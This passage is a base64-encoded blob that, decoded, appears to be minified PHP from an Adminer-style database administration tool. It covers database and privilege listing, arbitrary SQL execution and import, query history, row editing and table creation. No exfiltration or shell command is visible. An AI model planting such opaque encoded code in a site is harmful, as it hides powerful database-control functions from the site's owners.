ciLigkYT09IiI/IiBjaGVja2VkIjoiIikuIiBvbmNsaWNrPSdmb3JtQ2hlY2sodGhpcywgL15kYXRhYmFzZXNcXFsvKTsnPiIuJ0RhdGFiYXNlJy4iPC9sYWJlbD48L3RoZWFkPlxuIjskbD0kYi0+ZGF0YWJhc2VzKCk7aWYoJGwpe2ZvcmVhY2goJGwNCmFzJG0pe2lmKCFpbmZvcm1hdGlvbl9zY2hlbWEoJG0pKXskeGY9cHJlZ19yZXBsYWNlKCd+Xy4qficsJycsJG0pO2VjaG8iPHRyPjx0ZD4iLmNoZWNrYm94KCJkYXRhYmFzZXNbXSIsJG0sJGE9PSIifHwkYT09IiR4ZiUiLCRtLCJmb3JtVW5jaGVjaygnY2hlY2stZGF0YWJhc2VzJyk7IiwiYmxvY2siKS4iXG4iOyR5ZlskeGZdKys7fX19ZWxzZQ0KZWNobyI8dHI+PHRkPjx0ZXh0YXJlYSBuYW1lPSdkYXRhYmFzZXMnIHJvd3M9JzEwJyBjb2xzPScyMCc+PC90ZXh0YXJlYT4iO31lY2hvJzwvdGFibGU+DQo8L2Zvcm0+DQonOyRJYz10cnVlO2ZvcmVhY2goJHlmDQphcyR4PT4kWCl7aWYoJHghPSIiJiYkWD4xKXtlY2hvKCRJYz8iPHA+IjoiICIpLiI8YSBocmVmPSciLmgoTUUpLiJkdW1wPSIudXJsZW5jb2RlKCIkeCUiKS4iJz4iLmgoJHgpLiI8L2E+IjskSWM9ZmFsc2U7fX19ZWxzZWlmKGlzc2V0KCRfR0VUWyJwcml2aWxlZ2VzIl0pKXtwYWdlX2hlYWRlcignUHJpdmlsZWdlcycpOyRJPSRnLT5xdWVyeSgiU0VMRUNUIFVzZXIsIEhvc3QgRlJPTSBteXNxbC4iLihEQj09IiI/InVzZXIiOiJkYiBXSEVSRSAiLnEoREIpLiIgTElLRSBEYiIpLiIgT1JERVIgQlkgSG9zdCwgVXNlciIpOyRUYz0kSTtpZighJEkpJEk9JGctPnF1ZXJ5KCJTRUxFQ1QgU1VCU1RSSU5HX0lOREVYKENVUlJFTlRfVVNFUiwgJ0AnLCAxKSBBUyBVc2VyLCBTVUJTVFJJTkdfSU5ERVgoQ1VSUkVOVF9VU0VSLCAnQCcsIC0xKSBBUyBIb3N0Iik7ZWNobyI8Zm9ybSBhY3Rpb249Jyc+PHA+XG4iO2hpZGRlbl9maWVsZHNfZ2V0KCk7ZWNobyI8aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSdkYicgdmFsdWU9JyIuaChEQikuIic+XG4iLCgkVGM/IiI6IjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2dyYW50JyB2YWx1ZT0nJz5cbiIpLCI8dGFibGUgY2VsbHNwYWNpbmc9JzAnPlxuIiwiPHRoZWFkPjx0cj48dGg+Ii4nVXNlcm5hbWUnLiI8dGg+Ii4nU2VydmVyJy4iPHRoPiZuYnNwOzwvdGhlYWQ+XG4iO3doaWxlKCRLPSRJLT5mZXRjaF9hc3NvYygpKWVjaG8nPHRyJy5vZGQoKS4nPjx0ZD4nLmgoJEtbIlVzZXIiXSkuIjx0ZD4iLmgoJEtbIkhvc3QiXSkuJzx0ZD48YSBocmVmPSInLmgoTUUuJ3VzZXI9Jy51cmxlbmNvZGUoJEtbIlVzZXIiXSkuJyZob3N0PScudXJsZW5jb2RlKCRLWyJIb3N0Il0pKS4nIj4nLidFZGl0Jy4iPC9hPlxuIjtpZighJFRjfHxEQiE9IiIpZWNobyI8dHIiLm9kZCgpLiI+PHRkPjxpbnB1dCBuYW1lPSd1c2VyJyBhdXRvY2FwaXRhbGl6ZT0nb2ZmJz48dGQ+PGlucHV0IG5hbWU9J2hvc3QnIHZhbHVlPSdsb2NhbGhvc3QnIGF1dG9jYXBpdGFsaXplPSdvZmYnPjx0ZD48aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nIi4nRWRpdCcuIic+XG4iO2VjaG8iPC90YWJsZT5cbiIsIjwvZm9ybT5cbiIsJzxwIGNsYXNzPSJsaW5rcyI+PGEgaHJlZj0iJy5oKE1FKS4ndXNlcj0iPicuJ0NyZWF0ZSB1c2VyJy4iPC9hPiI7fWVsc2VpZihpc3NldCgkX0dFVFsic3FsIl0pKXtpZighJG4mJiRfUE9TVFsiZXhwb3J0Il0pe2R1bXBfaGVhZGVycygic3FsIik7JGItPmR1bXBUYWJsZSgiIiwiIik7JGItPmR1bXBEYXRhKCIiLCJ0YWJsZSIsJF9QT1NUWyJxdWVyeSJdKTtleGl0O31yZXN0YXJ0X3Nlc3Npb24oKTskZGQ9JmdldF9zZXNzaW9uKCJxdWVyaWVzIik7JGNkPSYkZGRbREJdO2lmKCEkbiYmJF9QT1NUWyJjbGVhciJdKXskY2Q9YXJyYXkoKTtyZWRpcmVjdChyZW1vdmVfZnJvbV91cmkoImhpc3RvcnkiKSk7fXBhZ2VfaGVhZGVyKChpc3NldCgkX0dFVFsiaW1wb3J0Il0pPydJbXBvcnQnOidTUUwgY29tbWFuZCcpLCRuKTtpZighJG4mJiRfUE9TVCl7JFFjPWZhbHNlO2lmKCFpc3NldCgkX0dFVFsiaW1wb3J0Il0pKSRIPSRfUE9TVFsicXVlcnkiXTtlbHNlaWYoJF9QT1NUWyJ3ZWJmaWxlIl0peyRRYz1AZm9wZW4oKGZpbGVfZXhpc3RzKCJhZG1pbmVyLnNxbCIpPyJhZG1pbmVyLnNxbCI6ImNvbXByZXNzLnpsaWI6Ly9hZG1pbmVyLnNxbC5neiIpLCJyYiIpOyRIPSgkUWM/ZnJlYWQoJFFjLDFlNik6ZmFsc2UpO31lbHNlJEg9Z2V0X2ZpbGUoInNxbF9maWxlIix0cnVlKTtpZihpc19zdHJpbmcoJEgpKXtpZihmdW5jdGlvbl9leGlzdHMoJ21lbW9yeV9nZXRfdXNhZ2UnKSlAaW5pX3NldCgibWVtb3J5X2xpbWl0IixtYXgoaW5pX2J5dGVzKCJtZW1vcnlfbGltaXQiKSwyKnN0cmxlbigkSCkrbWVtb3J5X2dldF91c2FnZSgpKzhlNikpO2lmKCRIIT0iIiYmc3RybGVuKCRIKTwxZTYpeyRIZj0kSC4ocHJlZ19tYXRjaCgifjtbIFx0XHJcbl0qXCR+IiwkSCk/IiI6IjsiKTtpZighJGNkfHxyZXNldChlbmQoJGNkKSkhPSRIZil7cmVzdGFydF9zZXNzaW9uKCk7JGNkW109YXJyYXkoJEhmLHRpbWUoKSk7c2V0X3Nlc3Npb24oInF1ZXJpZXMiLCRkZCk7c3RvcF9zZXNzaW9uKCk7fX0kQmc9Iig/Olxcc3wvXFwqW1xzXFNdKj9cXCovfCg/OiN8LS0gKVteXG5dKlxuP3wtLVxyP1xuKSI7JExiPSI7IjskRD0wOyRrYz10cnVlOyRoPWNvbm5lY3QoKTtpZihpc19vYmplY3QoJGgpJiZEQiE9IiIpJGgtPnNlbGVjdF9kYihEQik7JHBiPTA7JHBjPWFycmF5KCk7JGhmPSdbXCciJy4oJHc9PSJzcWwiPydgIyc6KCR3PT0ic3FsaXRlIj8nYFsnOigkdz09Im1zc3FsIj8nWyc6JycpKSkuJ118L1xcKnwtLSB8JCcuKCR3PT0icGdzcWwiPyd8XFwkW14kXSpcXCQnOicnKTskcGg9bWljcm90aW1lKHRydWUpO3BhcnNlX3N0cigkX0NPT0tJRVsiYWRtaW5lcl9leHBvcnQiXSwkd2EpOyRiYz0kYi0+ZHVtcEZvcm1hdCgpO3Vuc2V0KCRiY1sic3FsIl0pO3doaWxlKCRIIT0iIil7aWYoISREJiZwcmVnX21hdGNoKCJ+XiRCZyorREVMSU1JVEVSXFxzKyhcXFMrKX5pIiwkSCwkQikpeyRMYj0kQlsxXTskSD1zdWJzdHIoJEgsc3RybGVuKCRCWzBdKSk7fWVsc2V7cHJlZ19tYXRjaCgnKCcucHJlZ19xdW90ZSgkTGIpLiJcXHMqfCRoZikiLCRILCRCLFBSRUdfT0ZGU0VUX0NBUFRVUkUsJEQpO2xpc3QoJE9jLCR0Zik9JEJbMF07aWYoISRPYyYmJFFjJiYhZmVvZigkUWMpKSRILj1mcmVhZCgkUWMsMWU1KTtlbHNle2lmKCEkT2MmJnJ0cmltKCRIKT09IiIpYnJlYWs7JEQ9JHRmK3N0cmxlbigkT2MpO2lmKCRPYyYmcnRyaW0oJE9jKSE9JExiKXt3aGlsZShwcmVnX21hdGNoKCcoJy4oJE9jPT0nLyonPydcXCovJzooJE9jPT0nWyc/J10nOihwcmVnX21hdGNoKCd+Xi0tIHxeI34nLCRPYyk/IlxuIjpwcmVnX3F1b3RlKCRPYykuInxcXFxcLiIpKSkuJ3wkKXMnLCRILCRCLFBSRUdfT0ZGU0VUX0NBUFRVUkUsJEQpKXskaWc9JEJbMF1bMF07aWYoISRpZyYmJFFjJiYhZmVvZigkUWMpKSRILj1mcmVhZCgkUWMsMWU1KTtlbHNleyREPSRCWzBdWzFdK3N0cmxlbigkaWcpO2lmKCRpZ1swXSE9IlxcIilicmVhazt9fX1lbHNleyRrYz1mYWxzZTskSGY9c3Vic3RyKCRILDAsJHRmKTskcGIrKzskQWY9IjxwcmUgaWQ9J3NxbC0kcGInPjxjb2RlIGNsYXNzPSdqdXNoLSR3Jz4iLnNob3J0ZW5fdXRmOCh0cmltKCRIZiksMTAwMCkuIjwvY29kZT48L3ByZT5cbiI7aWYoJHc9PSJzcWxpdGUiJiZwcmVnX21hdGNoKCJ+XiRCZyorQVRUQUNIXFxifmkiLCRIZiwkQikpe2VjaG8kQWYsIjxwIGNsYXNzPSdlcnJvcic+Ii4nQVRUQUNIIHF1ZXJpZXMgYXJlIG5vdCBzdXBwb3J0ZWQuJy4iXG4iOyRwY1tdPSIgPGEgaHJlZj0nI3NxbC0kcGInPiRwYjwvYT4iO2lmKCRfUE9TVFsiZXJyb3Jfc3RvcHMiXSlicmVhazt9ZWxzZXtpZighJF9QT1NUWyJvbmx5X2Vycm9ycyJdKXtlY2hvJEFmO29iX2ZsdXNoKCk7Zmx1c2goKTt9JEVnPW1pY3JvdGltZSh0cnVlKTtpZigkZy0+bXVsdGlfcXVlcnkoJEhmKSYmaXNfb2JqZWN0KCRoKSYmcHJlZ19tYXRjaCgifl4kQmcqK1VTRVxcYn5pIiwkSGYpKSRoLT5xdWVyeSgkSGYpO2RveyRJPSRnLT5zdG9yZV9yZXN1bHQoKTskZmg9IiA8c3BhbiBjbGFzcz0ndGltZSc+KCIuZm9ybWF0X3RpbWUoJEVnKS4iKTwvc3Bhbj4iLihzdHJsZW4oJEhmKTwxMDAwPyIgPGEgaHJlZj0nIi5oKE1FKS4ic3FsPSIudXJsZW5jb2RlKHRyaW0oJEhmKSkuIic+Ii4nRWRpdCcuIjwvYT4iOiIiKTtpZigkZy0+ZXJyb3Ipe2VjaG8oJF9QT1NUWyJvbmx5X2Vycm9ycyJdPyRBZjoiIiksIjxwIGNsYXNzPSdlcnJvcic+Ii4nRXJyb3IgaW4gcXVlcnknLigkZy0+ZXJybm8/IiAoJGctPmVycm5vKSI6IiIpLiI6ICIuZXJyb3IoKS4iXG4iOyRwY1tdPSIgPGEgaHJlZj0nI3NxbC0kcGInPiRwYjwvYT4iO2lmKCRfUE9TVFsiZXJyb3Jfc3RvcHMiXSlicmVhaw0KMjt9ZWxzZWlmKGlzX29iamVjdCgkSSkpeyR6PSRfUE9TVFsibGltaXQiXTskV2U9c2VsZWN0KCRJLCRoLGFycmF5KCksJHopO2lmKCEkX1BPU1RbIm9ubHlfZXJyb3JzIl0pe2VjaG8iPGZvcm0gYWN0aW9uPScnIG1ldGhvZD0ncG9zdCc+XG4iOyRfZT0kSS0+bnVtX3Jvd3M7ZWNobyI8cD4iLigkX2U/KCR6JiYkX2U+JHo/c3ByaW50ZignJWQgLyAnLCR6KToiIikubGFuZyhhcnJheSgnJWQgcm93JywnJWQgcm93cycpLCRfZSk6IiIpLCRmaDskaGQ9ImV4cG9ydC0kcGIiOyR5Yz0iLCA8YSBocmVmPScjJGhkJyBvbmNsaWNrPVwicmV0dXJuICF0b2dnbGUoJyRoZCcpO1wiPiIuJ0V4cG9ydCcuIjwvYT48c3BhbiBpZD0nJGhkJyBjbGFzcz0naGlkZGVuJz46ICIuaHRtbF9zZWxlY3QoIm91dHB1dCIsJGItPmR1bXBPdXRwdXQoKSwkd2FbIm91dHB1dCJdKS4iICIuaHRtbF9zZWxlY3QoImZvcm1hdCIsJGJjLCR3YVsiZm9ybWF0Il0pLiI8aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSdxdWVyeScgdmFsdWU9JyIuaCgkSGYpLiInPiIuIiA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdleHBvcnQnIHZhbHVlPSciLidFeHBvcnQnLiInPjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J3Rva2VuJyB2YWx1ZT0nJFQnPjwvc3Bhbj5cbiI7aWYoJGgmJnByZWdfbWF0Y2goIn5eKCRCZ3xcXCgpKitTRUxFQ1RcXGJ+aSIsJEhmKSYmKCR4Yz1leHBsYWluKCRoLCRIZikpKXskaGQ9ImV4cGxhaW4tJHBiIjtlY2hvIiwgPGEgaHJlZj0nIyRoZCcgb25jbGljaz1cInJldHVybiAhdG9nZ2xlKCckaGQnKTtcIj5FWFBMQUlOPC9hPiR5YyIsIjxkaXYgaWQ9JyRoZCcgY2xhc3M9J2hpZGRlbic+XG4iO3NlbGVjdCgkeGMsJGgsJFdlKTtlY2hvIjwvZGl2PlxuIjt9ZWxzZQ0KZWNobyR5YztlY2hvIjwvZm9ybT5cbiI7fX1lbHNle2lmKHByZWdfbWF0Y2goIn5eJEJnKisoQ1JFQVRFfERST1B8QUxURVIpJEJnKysoREFUQUJBU0V8U0NIRU1BKVxcYn5pIiwkSGYpKXtyZXN0YXJ0X3Nlc3Npb24oKTtzZXRfc2Vzc2lvbigiZGJzIixudWxsKTtzdG9wX3Nlc3Npb24oKTt9aWYoISRfUE9TVFsib25seV9lcnJvcnMiXSllY2hvIjxwIGNsYXNzPSdtZXNzYWdlJyB0aXRsZT0nIi5oKCRnLT5pbmZvKS4iJz4iLmxhbmcoYXJyYXkoJ1F1ZXJ5IGV4ZWN1dGVkIE9LLCAlZCByb3cgYWZmZWN0ZWQuJywnUXVlcnkgZXhlY3V0ZWQgT0ssICVkIHJvd3MgYWZmZWN0ZWQuJyksJGctPmFmZmVjdGVkX3Jvd3MpLiIkZmhcbiI7fSRFZz1taWNyb3RpbWUodHJ1ZSk7fXdoaWxlKCRnLT5uZXh0X3Jlc3VsdCgpKTt9JEg9c3Vic3RyKCRILCREKTskRD0wO319fX1pZigka2MpZWNobyI8cCBjbGFzcz0nbWVzc2FnZSc+Ii4nTm8gY29tbWFuZHMgdG8gZXhlY3V0ZS4nLiJcbiI7ZWxzZWlmKCRfUE9TVFsib25seV9lcnJvcnMiXSl7ZWNobyI8cCBjbGFzcz0nbWVzc2FnZSc+Ii5sYW5nKGFycmF5KCclZCBxdWVyeSBleGVjdXRlZCBPSy4nLCclZCBxdWVyaWVzIGV4ZWN1dGVkIE9LLicpLCRwYi1jb3VudCgkcGMpKSwiIDxzcGFuIGNsYXNzPSd0aW1lJz4oIi5mb3JtYXRfdGltZSgkcGgpLiIpPC9zcGFuPlxuIjt9ZWxzZWlmKCRwYyYmJHBiPjEpZWNobyI8cCBjbGFzcz0nZXJyb3InPiIuJ0Vycm9yIGluIHF1ZXJ5Jy4iOiAiLmltcGxvZGUoIiIsJHBjKS4iXG4iO31lbHNlDQplY2hvIjxwIGNsYXNzPSdlcnJvcic+Ii51cGxvYWRfZXJyb3IoJEgpLiJcbiI7fWVjaG8nDQo8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBpZD0iZm9ybSI+DQonOyR1Yz0iPGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9JyIuJ0V4ZWN1dGUnLiInIHRpdGxlPSdDdHJsK0VudGVyJz4iO2lmKCFpc3NldCgkX0dFVFsiaW1wb3J0Il0pKXskSGY9JF9HRVRbInNxbCJdO2lmKCRfUE9TVCkkSGY9JF9QT1NUWyJxdWVyeSJdO2Vsc2VpZigkX0dFVFsiaGlzdG9yeSJdPT0iYWxsIikkSGY9JGNkO2Vsc2VpZigkX0dFVFsiaGlzdG9yeSJdIT0iIikkSGY9JGNkWyRfR0VUWyJoaXN0b3J5Il1dWzBdO2VjaG8iPHA+Ijt0ZXh0YXJlYSgicXVlcnkiLCRIZiwyMCk7ZWNobygkX1BPU1Q/IiI6IjxzY3JpcHQgdHlwZT0ndGV4dC9qYXZhc2NyaXB0Jz5mb2N1cyhkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgndGV4dGFyZWEnKVswXSk7PC9zY3JpcHQ+XG4iKSwiPHA+JHVjXG4iLCdMaW1pdCByb3dzJy4iOiA8aW5wdXQgdHlwZT0nbnVtYmVyJyBuYW1lPSdsaW1pdCcgY2xhc3M9J3NpemUnIHZhbHVlPSciLmgoJF9QT1NUPyRfUE9TVFsibGltaXQiXTokX0dFVFsibGltaXQiXSkuIic+XG4iO31lbHNle2VjaG8iPGZpZWxkc2V0PjxsZWdlbmQ+Ii4nRmlsZSB1cGxvYWQnLiI8L2xlZ2VuZD48ZGl2PiIsKGluaV9ib29sKCJmaWxlX3VwbG9hZHMiKT8iU1FMICgmbHQ7ICIuaW5pX2dldCgidXBsb2FkX21heF9maWxlc2l6ZSIpLiJCKTogPGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9J3NxbF9maWxlW10nIG11bHRpcGxlPlxuJHVjIjonRmlsZSB1cGxvYWRzIGFyZSBkaXNhYmxlZC4nKSwiPC9kaXY+PC9maWVsZHNldD5cbiIsIjxmaWVsZHNldD48bGVnZW5kPiIuJ0Zyb20gc2VydmVyJy4iPC9sZWdlbmQ+PGRpdj4iLHNwcmludGYoJ1dlYnNlcnZlciBmaWxlICVzJywiPGNvZGU+YWRtaW5lci5zcWwiLihleHRlbnNpb25fbG9hZGVkKCJ6bGliIik/IlsuZ3pdIjoiIikuIjwvY29kZT4iKSwnIDxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9IndlYmZpbGUiIHZhbHVlPSInLidSdW4gZmlsZScuJyI+JywiPC9kaXY+PC9maWVsZHNldD5cbiIsIjxwPiI7fWVjaG8NCmNoZWNrYm94KCJlcnJvcl9zdG9wcyIsMSwoJF9QT1NUPyRfUE9TVFsiZXJyb3Jfc3RvcHMiXTppc3NldCgkX0dFVFsiaW1wb3J0Il0pKSwnU3RvcCBvbiBlcnJvcicpLiJcbiIsY2hlY2tib3goIm9ubHlfZXJyb3JzIiwxLCgkX1BPU1Q/JF9QT1NUWyJvbmx5X2Vycm9ycyJdOmlzc2V0KCRfR0VUWyJpbXBvcnQiXSkpLCdTaG93IG9ubHkgZXJyb3JzJykuIlxuIiwiPGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0ndG9rZW4nIHZhbHVlPSckVCc+XG4iO2lmKCFpc3NldCgkX0dFVFsiaW1wb3J0Il0pJiYkY2Qpe3ByaW50X2ZpZWxkc2V0KCJoaXN0b3J5IiwnSGlzdG9yeScsJF9HRVRbImhpc3RvcnkiXSE9IiIpO2ZvcigkWD1lbmQoJGNkKTskWDskWD1wcmV2KCRjZCkpeyR4PWtleSgkY2QpO2xpc3QoJEhmLCRmaCwkZmMpPSRYO2VjaG8nPGEgaHJlZj0iJy5oKE1FLiJzcWw9Jmhpc3Rvcnk9JHgiKS4nIj4nLidFZGl0Jy4iPC9hPiIuIiA8c3BhbiBjbGFzcz0ndGltZScgdGl0bGU9JyIuQGRhdGUoJ1ktbS1kJywkZmgpLiInPiIuQGRhdGUoIkg6aTpzIiwkZmgpLiI8L3NwYW4+Ii4iIDxjb2RlIGNsYXNzPSdqdXNoLSR3Jz4iLnNob3J0ZW5fdXRmOChsdHJpbShzdHJfcmVwbGFjZSgiXG4iLCIgIixzdHJfcmVwbGFjZSgiXHIiLCIiLHByZWdfcmVwbGFjZSgnfl4oI3wtLSApLip+bScsJycsJEhmKSkpKSw4MCwiPC9jb2RlPiIpLigkZmM/IiA8c3BhbiBjbGFzcz0ndGltZSc+KCRmYyk8L3NwYW4+IjoiIikuIjxicj5cbiI7fWVjaG8iPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nY2xlYXInIHZhbHVlPSciLidDbGVhcicuIic+XG4iLCI8YSBocmVmPSciLmgoTUUuInNxbD0maGlzdG9yeT1hbGwiKS4iJz4iLidFZGl0IGFsbCcuIjwvYT5cbiIsIjwvZGl2PjwvZmllbGRzZXQ+XG4iO31lY2hvJzwvZm9ybT4NCic7fWVsc2VpZihpc3NldCgkX0dFVFsiZWRpdCJdKSl7JGE9JF9HRVRbImVkaXQiXTskcD1maWVsZHMoJGEpOyRaPShpc3NldCgkX0dFVFsic2VsZWN0Il0pPyhjb3VudCgkX1BPU1RbImNoZWNrIl0pPT0xP3doZXJlX2NoZWNrKCRfUE9TVFsiY2hlY2siXVswXSwkcCk6IiIpOndoZXJlKCRfR0VULCRwKSk7JEdoPShpc3NldCgkX0dFVFsic2VsZWN0Il0pPyRfUE9TVFsiZWRpdCJdOiRaKTtmb3JlYWNoKCRwDQphcyRDPT4kbyl7aWYoIWlzc2V0KCRvWyJwcml2aWxlZ2VzIl1bJEdoPyJ1cGRhdGUiOiJpbnNlcnQiXSl8fCRiLT5maWVsZE5hbWUoJG8pPT0iIil1bnNldCgkcFskQ10pO31pZigkX1BPU1QmJiEkbiYmIWlzc2V0KCRfR0VUWyJzZWxlY3QiXSkpeyRBPSRfUE9TVFsicmVmZXJlciJdO2lmKCRfUE9TVFsiaW5zZXJ0Il0pJEE9KCRHaD9udWxsOiRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdKTtlbHNlaWYoIXByZWdfbWF0Y2goJ35eLismc2VsZWN0PS4rJH4nLCRBKSkkQT1NRS4ic2VsZWN0PSIudXJsZW5jb2RlKCRhKTskdj1pbmRleGVzKCRhKTskQmg9dW5pcXVlX2FycmF5KCRfR0VUWyJ3aGVyZSJdLCR2KTskS2Y9IlxuV0hFUkUgJFoiO2lmKGlzc2V0KCRfUE9TVFsiZGVsZXRlIl0pKXF1ZXJpZXNfcmVkaXJlY3QoJEEsJ0l0ZW0gaGFzIGJlZW4gZGVsZXRlZC4nLCRVYi0+ZGVsZXRlKCRhLCRLZiwhJEJoKSk7ZWxzZXskTz1hcnJheSgpO2ZvcmVhY2goJHANCmFzJEM9PiRvKXskWD1wcm9jZXNzX2lucHV0KCRvKTtpZigkWCE9PWZhbHNlJiYkWCE9PW51bGwpJE9baWRmX2VzY2FwZSgkQyldPSRYO31pZigkR2gpe2lmKCEkTylyZWRpcmVjdCgkQSk7cXVlcmllc19yZWRpcmVjdCgkQSwnSXRlbSBoYXMgYmVlbiB1cGRhdGVkLicsJFViLT51cGRhdGUoJGEsJE8sJEtmLCEkQmgpKTtpZihpc19hamF4KCkpe3BhZ2VfaGVhZGVycygpO3BhZ2VfbWVzc2FnZXMoJG4pO2V4aXQ7fX1lbHNleyRJPSRVYi0+aW5zZXJ0KCRhLCRPKTskT2Q9KCRJP2xhc3RfaWQoKTowKTtxdWVyaWVzX3JlZGlyZWN0KCRBLHNwcmludGYoJ0l0ZW0lcyBoYXMgYmVlbiBpbnNlcnRlZC4nLCgkT2Q/IiAkT2QiOiIiKSksJEkpO319fSRLPW51bGw7aWYoJF9QT1NUWyJzYXZlIl0pJEs9KGFycmF5KSRfUE9TVFsiZmllbGRzIl07ZWxzZWlmKCRaKXskTT1hcnJheSgpO2ZvcmVhY2goJHANCmFzJEM9PiRvKXtpZihpc3NldCgkb1sicHJpdmlsZWdlcyJdWyJzZWxlY3QiXSkpeyRGYT1jb252ZXJ0X2ZpZWxkKCRvKTtpZigkX1BPU1RbImNsb25lIl0mJiRvWyJhdXRvX2luY3JlbWVudCJdKSRGYT0iJyciO2lmKCR3PT0ic3FsIiYmcHJlZ19tYXRjaCgifmVudW18c2V0fiIsJG9bInR5cGUiXSkpJEZhPSIxKiIuaWRmX2VzY2FwZSgkQyk7JE1bXT0oJEZhPyIkRmEgQVMgIjoiIikuaWRmX2VzY2FwZSgkQyk7fX0kSz1hcnJheSgpO2lmKCFzdXBwb3J0KCJ0YWJsZSIpKSRNPWFycmF5KCIqIik7aWYoJE0peyRJPSRVYi0+c2VsZWN0KCRhLCRNLGFycmF5KCRaKSwkTSxhcnJheSgpLChpc3NldCgkX0dFVFsic2VsZWN0Il0pPzI6MSkpOyRLPSRJLT5mZXRjaF9hc3NvYygpO2lmKCEkSykkSz1mYWxzZTtpZihpc3NldCgkX0dFVFsic2VsZWN0Il0pJiYoISRLfHwkSS0+ZmV0Y2hfYXNzb2MoKSkpJEs9bnVsbDt9fWlmKCFzdXBwb3J0KCJ0YWJsZSIpJiYhJHApe2lmKCEkWil7JEk9JFViLT5zZWxlY3QoJGEsYXJyYXkoIioiKSwkWixhcnJheSgiKiIpKTskSz0oJEk/JEktPmZldGNoX2Fzc29jKCk6ZmFsc2UpO2lmKCEkSykkSz1hcnJheSgkVWItPnByaW1hcnk9PiIiKTt9aWYoJEspe2ZvcmVhY2goJEsNCmFzJHg9PiRYKXtpZighJFopJEtbJHhdPW51bGw7JHBbJHhdPWFycmF5KCJmaWVsZCI9PiR4LCJudWxsIj0+KCR4IT0kVWItPnByaW1hcnkpLCJhdXRvX2luY3JlbWVudCI9PigkeD09JFViLT5wcmltYXJ5KSk7fX19ZWRpdF9mb3JtKCRhLCRwLCRLLCRHaCk7fWVsc2VpZihpc3NldCgkX0dFVFsiY3JlYXRlIl0pKXskYT0kX0dFVFsiY3JlYXRlIl07JGlmPWFycmF5KCk7Zm9yZWFjaChhcnJheSgnSEFTSCcsJ0xJTkVBUiBIQVNIJywnS0VZJywnTElORUFSIEtFWScsJ1JBTkdFJywnTElTVCcpYXMkeCkkaWZbJHhdPSR4OyRSZj1yZWZlcmVuY2FibGVfcHJpbWFyeSgkYSk7JE1jPWFycmF5KCk7Zm9yZWFjaCgkUmYNCmFzJFFnPT4kbykkTWNbc3RyX3JlcGxhY2UoImAiLCJgYCIsJFFnKS4iYCIuc3RyX3JlcGxhY2UoImAiLCJgYCIsJG9bImZpZWxkIl0pXT0kUWc7JFplPWFycmF5KCk7JFI9YXJyYXkoKTtpZigkYSE9IiIpeyRaZT1maWVsZHMoJGEpOyRSPXRhYmxlX3N0YXR1cygkYSk7aWYoISRSKSRuPSdObyB0YWJsZXMuJzt9JEs9JF9QT1NUOyRLWyJmaWVsZHMiXT0oYXJyYXkpJEtbImZpZWxkcyJdO2lmKCRLWyJhdXRvX2luY3JlbWVudF9jb2wiXSkkS1siZmllbGRzIl1bJEtbImF1dG9faW5jcmVtZW50X2NvbCJdXVsiYXV0b19pbmNyZW1lbnQiXT10cnVlO2lmKCRfUE9TVCYmIXByb2Nlc3NfZmllbGRzKCRLWyJmaWVsZHMiXSkmJiEkbil7aWYoJF9QT1NUWyJkcm9wIl0pcXVlcmllc19yZWRpcmVjdChzdWJzdHIoTUUsMCwtMSksJ1RhYmxlIGhhcyBiZWVuIGRyb3BwZWQuJyxkcm9wX3RhYmxlcyhhcnJheSgkYSkpKTtlbHNleyRwPWFycmF5KCk7JENhPWFycmF5KCk7JEtoPWZhbHNlOyRLYz1hcnJheSgpO2tzb3J0KCRLWyJmaWVsZHMiXSk7JFllPXJlc2V0KCRaZSk7JF9hPSIgRklSU1QiO2ZvcmVhY2goJEtbImZpZWxkcyJdYXMkeD0+JG8peyRxPSRNY1skb1sidHlwZSJdXTskeGg9KCRxIT09bnVsbD8kUmZbJHFdOiRvKTtpZigkb1siZmllbGQiXSE9IiIpe2lmKCEkb1siaGFzX2RlZmF1bHQiXSkkb1siZGVmYXVsdCJdPW51bGw7aWYoJHg9PSRLWyJhdXRvX2luY3JlbWVudF9jb2wiXSkkb1siYXV0b19pbmNyZW1lbnQiXT10cnVlOyRGZj1wcm9jZXNzX2ZpZWxkKCRvLCR4aCk7JENhW109YXJyYXkoJG9bIm9yaWciXSwkRmYsJF9hKTtpZigkRmYhPXByb2Nlc3NfZmllbGQoJFllLCRZZSkpeyRwW109YXJyYXkoJG9bIm9yaWciXSwkRmYsJF9hKTtpZigkb1sib3JpZyJdIT0iInx8JF9hKSRLaD10cnVlO31pZigkcSE9PW51bGwpJEtjW2lkZl9lc2NhcGUoJG9bImZpZWxkIl0pXT0oJGEhPSIiJiYkdyE9InNxbGl0ZSI/IkFERCI6IiAiKS5mb3JtYXRfZm9yZWlnbl9rZXkoYXJyYXkoJ3RhYmxlJz0+JE1jWyRvWyJ0eXBlIl1dLCdzb3VyY2UnPT5hcnJheSgkb1siZmllbGQiXSksJ3RhcmdldCc9PmFycmF5KCR4aFsiZmllbGQiXSksJ29uX2RlbGV0ZSc9PiRvWyJvbl9kZWxldGUiXSwpKTskX2E9IiBBRlRFUiAiLmlkZl9lc2NhcGUoJG9bImZpZWxkIl0pO31lbHNlaWYoJG9bIm9yaWciXSE9IiIpeyRLaD10cnVlOyRwW109YXJyYXkoJG9bIm9yaWciXSk7fWlmKCRvWyJvcmlnIl0hPSIiKXskWWU9bmV4dCgkWmUpO2lmKCEkWWUpJF9hPSIiO319JGtmPSIiO2lmKCRpZlskS1sicGFydGl0aW9uX2J5Il1dKXskbGY9YXJyYXkoKTtpZigkS1sicGFydGl0aW9uX2J5Il09PSdSQU5HRSd8fCRLWyJwYXJ0aXRpb25fYnkiXT09J0xJU1QnKXtmb3JlYWNoKGFycmF5X2ZpbHRlcigkS1sicGFydGl0aW9uX25hbWVzIl0pYXMkeD0+